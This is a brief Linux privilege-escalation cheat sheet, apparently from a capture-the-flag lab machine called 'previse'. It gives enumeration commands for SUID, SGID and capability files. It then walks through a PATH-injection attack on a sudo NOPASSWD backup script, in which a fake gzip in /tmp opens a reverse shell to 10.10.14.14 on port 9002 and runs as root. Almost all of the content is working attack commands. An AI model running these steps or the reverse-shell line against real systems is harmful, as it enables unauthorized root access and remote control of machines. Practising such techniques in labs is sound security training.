
## Finding SUID 
```
find / -type f -perm /4000 2>/dev/null
```
or 
```
find / -type f -perm -u=s 2>/dev/null
```


## Finding HUID 
```
find / -type f -perm /2000 2>/dev/null
```
or 
```
find / -type f -perm -g=s 2>/dev/null
```

## Finding Capabilities
```
getcap -r / 2>/dev/null
```


## Path Injection With Sudo nopasswd

```
m4lwhere@previse:/tmp$ sudo -l
User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh
```

```
m4lwhere@previse:/tmp$ cat /opt/scripts/access_backup.sh
#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
```

```
m4lwhere@previse:/tmp$ cat gzip
#!/bin/bash

bash -c "sh -i >& /dev/tcp/10.10.14.14/9002 0>&1"
```

```
m4lwhere@previse:/tmp$ chmod +x gzip
```

```
m4lwhere@previse:/tmp$ export PATH=/tmp:$PATH
```

```
m4lwhere@previse:/tmp$ sudo -u root /opt/scripts/access_backup.sh
```
